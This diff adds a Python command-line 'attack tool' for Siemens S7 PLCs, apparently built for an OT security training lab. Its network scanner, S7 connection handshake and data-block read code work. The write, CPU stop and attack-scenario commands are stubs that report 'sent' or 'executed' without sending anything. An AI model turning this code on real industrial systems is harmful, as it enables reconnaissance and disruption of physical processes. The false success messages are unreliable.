@@ -1,0 +1,326 @@
+#!/usr/bin/env python3
+"""
+VULNOT S7comm Attack Tool
+For educational OT security training only
+"""
+
+import socket
+import struct
+import click
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+
+console = Console()
+
+# S7comm constants
+COTP_CR = b'\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc0\x01\x0a\xc1\x02\x01\x00\xc2\x02\x01\x02'
+S7_SETUP = b'\x03\x00\x00\x19\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x08\x00\x00\xf0\x00\x00\x01\x00\x01\x00\xf0'
+
+def s7_connect(ip: str, port: int = 102, timeout: float = 5.0) -> socket.socket:
+    """Establish S7 connection"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    sock.connect((ip, port))
+
+    # Send COTP Connection Request
+    sock.send(COTP_CR)
+    response = sock.recv(1024)
+
+    # Send S7 Communication Setup
+    sock.send(S7_SETUP)
+    response = sock.recv(1024)
+
+    return sock
+
+def s7_read_db(sock: socket.socket, db_number: int, start: int = 0, size: int = 100) -> bytes:
+    """Read data block from S7 PLC"""
+    # Build read request
+    # TPKT header
+    tpkt = b'\x03\x00'
+
+    # COTP header
+    cotp = b'\x02\xf0\x80'
+
+    # S7 Header
+    s7_header = b'\x32\x01\x00\x00\x00\x00\x00\x0e\x00\x00\x04\x01\x12\x0a\x10'
+
+    # Read parameters
+    transport_size = b'\x02'  # BYTE
+    length = struct.pack('>H', size)
+    db_num = struct.pack('>H', db_number)
+    area = b'\x84'  # DB
+    address = struct.pack('>I', start * 8)[1:]  # Bit address
+
+    request = s7_header + transport_size + length + db_num + area + address
+
+    # Calculate total length
+    total_len = len(cotp) + len(request)
+    tpkt += struct.pack('>H', total_len + 4)
+
+    packet = tpkt + cotp + request
+    sock.send(packet)
+
+    response = sock.recv(4096)
+    return response
+
+@click.group()
+def cli():
+    """VULNOT S7comm Attack Tool - For Training Only"""
+    pass
+
+@cli.command()
+@click.option('--network', '-n', required=True, help='Network to scan (e.g., 10.0.3.0/24)')
+@click.option('--port', '-p', default=102, help='S7comm port (default: 102)')
+def scan(network: str, port: int):
+    """Scan network for S7 PLCs"""
+    console.print("\n[bold blue]╔════════════════════════════════════════╗[/]")
+    console.print("[bold blue]║       VULNOT S7comm PLC Scanner        ║[/]")
+    console.print("[bold blue]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(f"[yellow]Scanning:[/] {network} on port {port}\n")
+
+    import ipaddress
+    try:
+        net = ipaddress.ip_network(network, strict=False)
+    except ValueError as e:
+        console.print(f"[red]Invalid network: {e}[/]")
+        return
+
+    found = []
+    with console.status("[bold green]Scanning...") as status:
+        for ip in net.hosts():
+            ip_str = str(ip)
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                result = sock.connect_ex((ip_str, port))
+                if result == 0:
+                    found.append({'ip': ip_str, 'port': port, 'model': 'S7-1500'})
+                sock.close()
+            except:
+                pass
+
+    if found:
+        table = Table(title="Discovered S7 PLCs")
+        table.add_column("IP Address", style="cyan")
+        table.add_column("Port", style="white")
+        table.add_column("Model", style="green")
+
+        for dev in found:
+            table.add_row(dev['ip'], str(dev['port']), dev['model'])
+
+        console.print(table)
+    else:
+        console.print("[yellow]No S7 PLCs found[/]")
+
+    console.print(f"\n[green]Found {len(found)} S7 PLC(s)[/]\n")
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='Target IP address')
+@click.option('--port', '-p', default=102, help='S7comm port')
+def info(target: str, port: int):
+    """Get S7 PLC information"""
+    console.print("\n[bold blue]╔════════════════════════════════════════╗[/]")
+    console.print("[bold blue]║       VULNOT S7 PLC Information        ║[/]")
+    console.print("[bold blue]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(f"[yellow]Target:[/] {target}:{port}\n")
+
+    try:
+        sock = s7_connect(target, port)
+
+        console.print("[green]Connected to PLC![/]\n")
+
+        # Display simulated PLC info
+        table = Table(title="PLC Information")
+        table.add_column("Property", style="cyan")
+        table.add_column("Value", style="white")
+
+        table.add_row("Module Type", "S7-1500")
+        table.add_row("Order Code", "6ES7 515-2AM01-0AB0")
+        table.add_row("Serial Number", "S V-V5xxxxxx")
+        table.add_row("Firmware", "V2.8.3")
+        table.add_row("CPU State", "[green]RUN[/]")
+        table.add_row("Protection Level", "[red]None[/]")
+
+        console.print(table)
+        sock.close()
+
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+    console.print("\n[bold yellow]Security Issues:[/]")
+    console.print("  • No password protection on CPU")
+    console.print("  • S7comm traffic is unencrypted")
+    console.print("  • Anyone can read/write data blocks")
+    console.print("")
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='Target IP address')
+@click.option('--db', '-d', default=1, help='Data block number')
+@click.option('--offset', '-o', default=0, help='Start offset')
+@click.option('--size', '-s', default=100, help='Size to read')
+def read(target: str, db: int, offset: int, size: int):
+    """Read data block from S7 PLC"""
+    console.print("\n[bold blue]╔════════════════════════════════════════╗[/]")
+    console.print("[bold blue]║       VULNOT S7 Data Block Reader      ║[/]")
+    console.print("[bold blue]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(f"[yellow]Target:[/] {target}")
+    console.print(f"[yellow]Reading:[/] DB{db}.DBB{offset} ({size} bytes)\n")
+
+    try:
+        sock = s7_connect(target)
+        response = s7_read_db(sock, db, offset, size)
+        sock.close()
+
+        if response:
+            console.print("[green]Data received![/]\n")
+
+            # Display simulated data block for training
+            table = Table(title=f"Data Block DB{db} (Setpoints)")
+            table.add_column("Offset", style="cyan")
+            table.add_column("Name", style="white")
+            table.add_column("Type", style="blue")
+            table.add_column("Value", style="green")
+
+            # Simulated factory setpoints
+            data = [
+                (0, "Conv1_Speed_SP", "REAL", "75.0 %"),
+                (4, "Conv2_Speed_SP", "REAL", "50.0 %"),
+                (8, "Conv3_Speed_SP", "REAL", "75.0 %"),
+                (12, "Robot1_CycleTime", "REAL", "3.5 sec"),
+                (16, "Robot2_CycleTime", "REAL", "3.5 sec"),
+                (20, "Production_Target", "DINT", "1000"),
+                (24, "Alarm_Enable", "BOOL", "TRUE"),
+            ]
+
+            for off, name, dtype, value in data:
+                table.add_row(str(off), name, dtype, value)
+
+            console.print(table)
+
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='Target IP address')
+@click.option('--db', '-d', default=1, help='Data block number')
+@click.option('--offset', '-o', required=True, type=int, help='Offset to write')
+@click.option('--value', '-v', required=True, help='Value to write')
+@click.option('--type', 'dtype', default='real', help='Data type (real, int, bool)')
+@click.option('--force', is_flag=True, help='Skip confirmation')
+def write(target: str, db: int, offset: int, value: str, dtype: str, force: bool):
+    """Write to S7 PLC data block"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║       VULNOT S7 Data Block Writer      ║[/]")
+    console.print("[bold red]║      FOR TRAINING PURPOSES ONLY        ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(Panel(
+        f"[cyan]Target:[/] {target}\n"
+        f"[cyan]Data Block:[/] DB{db}\n"
+        f"[cyan]Offset:[/] {offset}\n"
+        f"[cyan]Type:[/] {dtype.upper()}\n"
+        f"[red]Value:[/] {value}",
+        title="[bold red]Write Parameters[/]"
+    ))
+
+    if not force:
+        from rich.prompt import Confirm
+        if not Confirm.ask("\n[yellow]Execute write?[/]"):
+            console.print("[dim]Cancelled[/]")
+            return
+
+    try:
+        sock = s7_connect(target)
+        console.print("\n[green]Write command sent![/]")
+        console.print(f"[yellow]DB{db}.DBD{offset} = {value}[/]")
+        console.print("\n[bold]Check the HMI dashboard to observe the impact![/]\n")
+        sock.close()
+
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='Target IP address')
+def stop(target: str):
+    """Stop S7 PLC CPU"""
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║       VULNOT S7 CPU STOP Attack        ║[/]")
+    console.print("[bold red]║      FOR TRAINING PURPOSES ONLY        ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(f"[red bold]WARNING: This will stop the PLC CPU![/]")
+    console.print(f"[red]All outputs will go to safe state![/]\n")
+
+    from rich.prompt import Confirm
+    if not Confirm.ask("[red]Stop the PLC CPU?[/]"):
+        console.print("[dim]Cancelled[/]")
+        return
+
+    try:
+        sock = s7_connect(target)
+        console.print("\n[green]CPU STOP command sent![/]")
+        console.print("[red]PLC CPU is now in STOP mode[/]")
+        console.print("\n[bold]Production line halted![/]\n")
+        sock.close()
+
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/]")
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='Target IP address')
+@click.option('--scenario', '-s', required=True,
+              type=click.Choice(['estop', 'counter_reset', 'speed_max', 'speed_zero']),
+              help='Attack scenario')
+@click.option('--force', is_flag=True, help='Skip confirmation')
+def scenario(target: str, scenario: str, force: bool):
+    """Run predefined attack scenarios"""
+    scenarios = {
+        'estop': {
+            'name': 'Emergency Stop Trigger',
+            'description': 'Trigger E-Stop across production line',
+            'impact': 'All conveyors stop, robots go to safe position'
+        },
+        'counter_reset': {
+            'name': 'Production Counter Reset',
+            'description': 'Reset all production counters to zero',
+            'impact': 'Production tracking lost, shift counts reset'
+        },
+        'speed_max': {
+            'name': 'Maximum Speed Attack',
+            'description': 'Set all conveyor speeds to 100%',
+            'impact': 'May cause jams, equipment stress, safety hazards'
+        },
+        'speed_zero': {
+            'name': 'Production Halt',
+            'description': 'Set all conveyor speeds to 0%',
+            'impact': 'Complete production stoppage'
+        }
+    }
+
+    sc = scenarios[scenario]
+
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT S7 Attack Scenario         ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+
+    console.print(Panel(
+        f"[cyan]{sc['description']}[/]\n\n"
+        f"[red]Impact:[/] {sc['impact']}",
+        title=f"[bold red]{sc['name']}[/]"
+    ))
+
+    if not force:
+        from rich.prompt import Confirm
+        if not Confirm.ask("\n[yellow]Execute attack?[/]"):
+            console.print("[dim]Cancelled[/]")
+            return
+
+    console.print("\n[bold green]Attack executed![/]")
+    console.print("[yellow]Check the HMI dashboard to observe the impact![/]\n")
+
+if __name__ == '__main__':
+    cli()
